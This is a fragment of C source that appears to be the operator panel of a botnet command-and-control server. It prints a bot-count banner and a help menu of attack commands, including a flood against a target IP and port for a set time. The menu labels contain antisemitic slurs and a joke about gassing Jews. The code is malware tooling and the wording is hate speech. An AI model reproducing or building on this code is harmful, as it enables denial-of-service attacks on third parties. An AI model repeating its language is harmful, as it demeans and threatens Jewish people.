...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
		...
		sprintf(ascii_banner_line1, "\x1b[36m   MMM        MMM  MMM\r\n");
		sprintf(ascii_banner_line2, "\x1b[36m   MM MM    MM MM  MM MM\r\n");
		sprintf(ascii_banner_line3, "\x1b[36m   MM  MM  MM  MM  MM   MM\r\n");
		sprintf(ascii_banner_line4, "\x1b[36m   MM   MmM    MM  MM MM\r\n");
		sprintf(ascii_banner_line5, "\x1b[36m   MM          MM  MMM\r\n");
		sprintf(ascii_banner_line6, "\x1b[36m   MM          MM  MM\\r\n");
		sprintf(ascii_banner_line7, "\x1b[36m   MM          MM  MM \\r\n");
		sprintf(ascii_banner_line8, "\x1b[36m   MM          MM  MM  \\r\n");
		sprintf(ascii_banner_line9, "\r\n");	
		sprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mMinion Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected(), OperatorsConnected); 
		...
		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
			...
			if(strstr(buf, "HELP")) {
				...
				sprintf(helpline5,  "   \x1b[37m- Fuck CNC - \x1b[36m!* CNC IP PORT TIME\r\n");
				sprintf(helpline7,  "   \x1b[37m- Kills Attack - \x1b[36mKILL\r\n");
				sprintf(helpline9,  "   \x1b[37m- jew Count - \x1b[36mBOTS\r\n");
				sprintf(helpline11, "   \x1b[37m- gas jews - \x1b[36mCLEAR\r\n");
				sprintf(helpline12, "   \x1b[37m- LOGOUT - \x1b[36mLOGOUT\r\n");
				sprintf(helpline13, "   \x1b[37m- T.O.S - \x1b[36mTOS\r\n");
				sprintf(helpline14, "   \r\n");
